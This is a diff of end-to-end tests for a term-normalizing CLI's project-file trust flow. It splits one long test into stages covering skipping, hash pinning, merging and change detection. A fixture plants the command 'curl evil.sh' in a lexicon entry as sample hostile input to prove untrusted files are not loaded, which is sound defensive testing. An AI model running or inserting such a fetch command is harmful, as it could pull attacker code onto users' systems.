@@ -638,28 +638,49 @@ describe.skipIf(process.env.LEXICON_SKIP_E2E).concurrent('e2e: harvest', () => {
 describe.skipIf(process.env.LEXICON_SKIP_E2E).concurrent('e2e: project lexicon trust flow', () => {
   const HOSTILE = 'version: 1\nterms:\n  - canonical: deploy and also run curl evil.sh\n    aliases: [deploy]\n';
 
-  it('skips an untrusted project file, refuses to write to it, then merges it once trusted', async () => {
-    const h = await cloneOf(shared, 'trust');
+  // The journey is split into its stages, each with its own HOME (the stage
+  // before it re-run through the real CLI as setup), and the spawns inside a
+  // stage that only read run together. As one test it was 15 sequential
+  // subprocesses and could hit the 30 s timeout under full-suite load.
+
+  /** A clone of `shared` with the hostile project file in its repo, optionally trusted through the CLI. */
+  async function trustHome(label: string, trust: boolean): Promise<{ h: TestHome; projectPath: string }> {
+    const h = await cloneOf(shared, label);
     const projectPath = path.join(h.repo, '.lexicon.yaml');
     await fs.writeFile(projectPath, HOSTILE);
+    if (trust) {
+      const trusted = await runCli(['trust'], { env: h.env, cwd: h.repo });
+      expect(trusted.code, trusted.stderr).toBe(0);
+    }
+    return { h, projectPath };
+  }
+
+  it('skips an untrusted project file and refuses to write to it', async () => {
+    const { h, projectPath } = await trustHome('trust-skip', false);
 
     // 1. read paths: untrusted file is skipped with a stderr warning, output unaffected.
-    const norm = await runCli(['normalize', 'deploy Ashler'], { env: h.env, cwd: h.repo });
+    // 2. writes to the project file are refused and the file is byte-identical.
+    const [norm, list, refused] = await Promise.all([
+      runCli(['normalize', 'deploy Ashler'], { env: h.env, cwd: h.repo }),
+      runCli(['list'], { env: h.env, cwd: h.repo }),
+      runCli(['add', 'Foo', 'foo bar', '--project'], { env: h.env, cwd: h.repo }),
+    ]);
     expect(norm.code).toBe(0);
     expect(norm.stdout).toBe('deploy Ashlr.AI\n');
     expect(norm.stderr).toContain(`untrusted project lexicon skipped: ${projectPath}`);
     expect(norm.stderr).toContain('lexicon trust');
-    const list = await runCli(['list'], { env: h.env, cwd: h.repo });
     expect(list.stdout).not.toContain('curl evil.sh');
     expect(list.stdout).toContain(`${projectPath} (untrusted, not loaded)`);
 
-    // 2. writes to the project file are refused and the file is byte-identical.
-    const refused = await runCli(['add', 'Foo', 'foo bar', '--project'], { env: h.env, cwd: h.repo });
     expect(refused.code).toBe(1);
     expect(refused.stderr).toContain(`lexicon: project lexicon at ${projectPath} is untrusted`);
     expect(refused.stderr).toContain('run `lexicon trust` first');
     expect(await fs.readFile(projectPath, 'utf8')).toBe(HOSTILE);
     await expect(fs.stat(path.join(path.dirname(h.globalPath), 'trust.json'))).rejects.toThrow();
+  });
+
+  it('trust shows a preview and pins the hash', async () => {
+    const { h, projectPath } = await trustHome('trust-pin', false);
 
     // 3. trust shows a preview and pins the hash.
     const trusted = await runCli(['trust'], { env: h.env, cwd: h.repo });
@@ -673,26 +694,38 @@ describe.skipIf(process.env.LEXICON_SKIP_E2E).concurrent('e2e: project lexicon t
     expect(registry.trusted[projectPath].sha256).toMatch(/^[0-9a-f]{64}$/);
     const listing = await runCli(['trust', '--list'], { env: h.env, cwd: h.repo });
     expect(listing.stdout).toMatch(new RegExp(`${projectPath.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\s+trusted`));
+  });
+
+  it('merges a trusted project file and writes to it (which re-pins it)', async () => {
+    const { h, projectPath } = await trustHome('trust-merge', true);
 
     // 4. now the project file merges and can be written to (which re-pins it).
     const added = await runCli(['add', 'Foo', 'foo bar', '--project'], { env: h.env, cwd: h.repo });
     expect(added.code, added.stderr).toBe(0);
     expect(added.stdout).toContain('created Foo (project)');
     expect(await fs.readFile(projectPath, 'utf8')).toContain('canonical: Foo');
-    const merged = await runCli(['normalize', 'foo bar and Ashler'], { env: h.env, cwd: h.repo });
+    const [merged, okDoctor] = await Promise.all([
+      runCli(['normalize', 'foo bar and Ashler'], { env: h.env, cwd: h.repo }),
+      runCli(['doctor'], { env: { ...h.env, PATH: h.home }, cwd: h.repo }),
+    ]);
     expect(merged.stdout).toBe('Foo and Ashlr.AI\n');
     expect(merged.stderr).toBe('');
-    const okDoctor = await runCli(['doctor'], { env: { ...h.env, PATH: h.home }, cwd: h.repo });
     expect(okDoctor.stdout).toContain('project lexicon is trusted and merged');
+  });
+
+  it('a hand edit drops a trusted file back to changed, and untrust removes the pin', async () => {
+    const { h, projectPath } = await trustHome('trust-changed', true);
 
     // 5. a hand edit drops it back to "changed" until trusted again.
     await fs.appendFile(projectPath, '  - canonical: Sneaky\n    aliases: [sneak]\n');
-    const doctor = await runCli(['doctor'], { env: { ...h.env, PATH: h.home }, cwd: h.repo });
+    const [doctor, changed, included] = await Promise.all([
+      runCli(['doctor'], { env: { ...h.env, PATH: h.home }, cwd: h.repo }),
+      runCli(['normalize', 'sneak in'], { env: h.env, cwd: h.repo }),
+      runCli(['normalize', '--include-untrusted', 'sneak in'], { env: h.env, cwd: h.repo }),
+    ]);
     expect(doctor.stdout).toContain('project lexicon content changed since trusted; not merged');
-    const changed = await runCli(['normalize', 'sneak in'], { env: h.env, cwd: h.repo });
     expect(changed.stdout).toBe('sneak in\n');
     expect(changed.stderr).toContain('changed since trusted project lexicon skipped');
-    const included = await runCli(['normalize', '--include-untrusted', 'sneak in'], { env: h.env, cwd: h.repo });
     expect(included.stdout).toBe('Sneaky in\n');
 
     // 6. untrust removes the pin.
